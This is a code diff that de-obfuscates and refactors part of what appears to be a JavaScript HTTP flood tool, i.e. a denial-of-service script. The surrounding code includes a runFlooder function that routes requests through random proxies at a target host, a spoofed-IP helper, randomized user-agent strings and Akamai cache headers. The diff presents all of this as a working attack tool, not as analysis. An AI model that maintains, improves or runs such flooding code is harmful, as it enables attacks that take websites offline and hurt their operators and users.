@@ -298,10 +298,6 @@ function getTitleFromHTML(html) {
   return 'Not Found';
 }
 
-function randomIntn(min, max) {
-  return Math.floor(Math.random() * (max - min) + min);
-}
-
 function randstr(_0x6ba01d) {
   var _0x404460 = '';
   var _0x1b31e9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
@@ -329,9 +325,12 @@ function randnombor(_0x3af870) {
   ;
   return _0x5c028c;
 }
+function randomIntn(min, max) {
+  return Math.floor(Math.random() * (max - min) + min);
+}
 
-function randomElement(_0x21da9f) {
-  return _0x21da9f[Math.floor(Math.random() * (_0x21da9f.length - 0x0) + 0x0)];
+function randomElement(elements) {
+  return elements[randomIntn(0, elements.length)];
 } 
 
 function spoofed(ip, privateRanges) {
@@ -3123,19 +3122,19 @@ headers.Pragma = "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-ca
 headers['x-frame-options'] = randomHeaders["x-frame-options"];
 headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
 function runFlooder() {
-  const _0x4547fe = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
-  const _0x1f7c48 = _0x4547fe.split(':');
+  const proxyAddr = randomElement(proxies);
+  const parsedProxy = proxyAddr.split(':');
   headers.origin = 'https://' + parsedTarget.host;
   headers[":authority"] = parsedTarget.host;
   headers["user-agent"] = moz + az1 + uap1;
-  const _0x50454d = {
-    'host': _0x1f7c48[0x0],
-    'port': ~~_0x1f7c48[0x1],
+  const proxyOptions = {
+    'host': parsedProxy[0],
+    'port': ~~parsedProxy[1],
     'address': parsedTarget.host + ":443",
     'timeout': 0x64
   };
 
-  Socker.HTTP(_0x50454d, (_0x9e698b, _0x19756f) => {
+  Socker.HTTP(proxyOptions, (_0x9e698b, _0x19756f) => {
     if (_0x19756f) {
       return;
     }
